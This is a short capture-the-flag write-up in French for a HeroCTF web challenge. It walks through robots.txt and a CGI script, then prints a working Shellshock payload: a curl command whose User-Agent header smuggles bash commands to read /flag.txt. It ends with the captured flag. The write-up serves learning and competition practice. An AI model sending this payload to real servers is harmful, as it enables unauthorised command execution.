# C'est choquant

### Description

Un développeur est en train de faire son site internet. Il est sur que s'il n'y a aucune entrée utilisateur, il ne peut pas être piraté. Prouvez lui le contraire en récupérant le fichier /flag.txt!

Accéder au challenge

PS : Le bruteforce reste interdit sur cette épreuve.

Format : Hero{flag}

### Solution

Quand on arrive sur la page web, rien de bien intéressant.

Permier réflexe : aller voir le `robots.txt`

Ce fichier nous indique qu'il y a un fichier sensé être caché sous le nom de `th1s1ss3cr3t.txt`

Et dans ce même fichier, une petite phrase
>  "Hi Worty, I've put a test file for cgi-bin : wazuuup, check it out!".

cgi-bin est un réperoire dans lequel des scripts peuvent êtres exécutés.

En allant dans ce répertoire, on reçoit une erreur `403 Forbidden`

Je me dis alors que le script à utiliser est `cgi-bin/wazuuup`

Encore une fois, rien de bien intéressant, le script se contente de nous afficher la date et l'heure...

Après quelques recherches, il semblerait qu'il existe une faille nommée `shellshock` qui nous permet d'envoyer des commandes en bash. 

Le flag étant à la racine on tape la commande 
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cd /;cat flag.txt;'" http://challs.heroctf.fr:3015/cgi-bin/wazuuup/
```

[Shellshock Vulnerability](https://linuxfr.org/news/une-faille-nommee-shellshock)

Flag : `Hero{sh3llsh0ck_1s_c00l_!!}`
